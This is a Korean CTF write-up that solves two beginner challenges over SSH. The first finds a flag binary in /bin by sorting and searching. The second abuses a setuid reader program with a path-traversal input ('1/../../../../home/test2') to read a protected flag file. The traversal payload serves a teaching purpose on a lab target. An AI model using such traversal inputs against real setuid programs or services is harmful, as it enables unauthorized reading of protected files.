# Q1

### Keyword

- `ssh`, `binary file`, `디렉토리 구조`, `정렬`

### Solve

1. ssh 접속

```
$ ssh test1@ssh.knock-on.org

...

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

...

test1@5f882d6040af:~$
```

2. 힌트 확인 후 `/bin`와 같은 binary가 담기는 디렉토리에 flag가 있음을 예상

- `/bin` 뿐만아니라, `/sbin`, `/usr/bin`, `/usr/sbin`, `/usr/local/bin`, `/usr/local/sbin`, `/opt` 등등 바이너리는 다양한 디렉토리에 있을 수 있음
- 그러나 이 정보만으로 모든 바이너리를 찾기에는 시간이 많이 걸림

```
test1@5f882d6040af:/bin$ ls -al
total 22180
drwxr-xr-x 1 root root      4096 Feb 24 03:48  .
drwxr-xr-x 1 root root      4096 Feb 12 14:02  ..
-rwxr-xr-x 1 root root     51648 Jan  8 14:56 '['
-rwxr-xr-x 1 root root     14712 Feb 21  2022  addpart
-rwxr-xr-x 1 root root     18824 Oct  6 08:53  apt
-rwxr-xr-x 1 root root     84448 Oct  6 08:53  apt-cache
-rwxr-xr-x 1 root root     27104 Oct  6 08:53  apt-cdrom
-rwxr-xr-x 1 root root     27024 Oct  6 08:53  apt-config
-rwxr-xr-x 1 root root     51680 Oct  6 08:53  apt-get
-rwxr-xr-x 1 root root     28173 Oct  6 08:53  apt-key
-rwxr-xr-x 1 root root     51680 Oct  6 08:53  apt-mark

...

```

3. 검색 결과 정렬

- 출제자가 만든 binary는 최근에 만들어 졌음을 이용하여 시간별로 정렬하여 문제를 해결할 수 있음
- `ls -lt` 와 같이 시간 순으로 정렬을 하여 해결

```
test1@5f882d6040af:/bin$ ls -lt
total 22164
-rwxr-xr-x 1 root root     15968 Feb 24 03:47  echoflag
-rwxr-xr-x 1 root root       320 Feb 12 14:06  man
lrwxrwxrwx 1 root root        23 Feb 12 14:03  pager -> /etc/alternatives/pager

...

```

- 또는 `flag`, `test` 등등 유츄할 수 있는 키워드를 탐색하여 해결할 수 있음

```
test1@5f882d6040af:/bin$ find . -name "*flag*"
./echoflag
```

4. 찾은 binary를 실행하여 `flag`를 획득할 수 있음

```
test1@5f882d6040af:/bin$ ./echoflag
Wow you find it! the flag is KNOCKON{y0u_und3rst4nd_ab0ut_/b1n}
```



# Q2

### Keyword

- `ssh`, `setuid`, `find`, `상대경로`

### Solve

1. ssh 접속

```
$ ssh test2@ssh.knock-on.org

...

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

...

test2@4f882e6020ad:~$
```

2. find로 "Reader"라는 문자열이 들어간 프로그램을 탐색

- `/` : 가장 상위 디렉토리 기준 하위 디렉토리로 재귀적으로 탐색
- `-type f` : 파일만 탐색
- `-name "*Reader*"` : 정규표현식을 통해 이름에 `Redear`가 들어간 파일 탐색
- `2>/dev/null` : 불필요한 오류 무시

```
$ find / -type f -name "*Reader*" 2>/dev/null
/opt/fairyReaderV2
```

3. 해당 프로그램이 `setuid` 비트가 들어감을 확인

- `setuid`란 간단히 설명하면 해당 프로그램 실행 시에만 임시적으로 root 권한을 얻을 수 있게 하는 장치임
- 아래의 `ls` 결과로 `x` 대신에 `s` 가 들어간 모습을 통해 `setuid`가 설정됨을 알 수 있음

```
test2@e3a6f21df709:$ ls -l /opt/fairyReaderV2
-rwsrwsr-x 1 root root 16344 Feb 24 08:15 fairyReaderV2
```

4. 프로그램의 동작 방식을 관찰 및 분석하여, 상대 경로를 이용해 홈디렉토리에 있는 `flag`를 읽으면 됨

```
test2@56a6b5a7c6fc:~$ /opt/fairyReaderV2
I'll tell you a dreamlike fairy tale :)
Let me know which Episode you'd like to hear!

Input Episode number (1~10) : 1
Once upon a time, in a small town nestled between rolling hills and sparkling rivers, lived a cat named Whiskers. Whiskers was not your ordinary cat. He had a peculiar habit of walking backwards. It was a sight that amused many but bewildered even more.
Book is in here! -> /opt/data/story1/FLAG

Input Episode number (1~10) : dum
No book in here! -> /opt/data/storydum/FLAG

Input Episode number (1~10) : 1/../../../../home/test2
KNOCKON{f41ry_t4l3_1s_s000000_b0r1ng!!}
Book is in here! -> /opt/data/story1/../../../../home/test2/FLAG

Input Episode number (1~10) :
```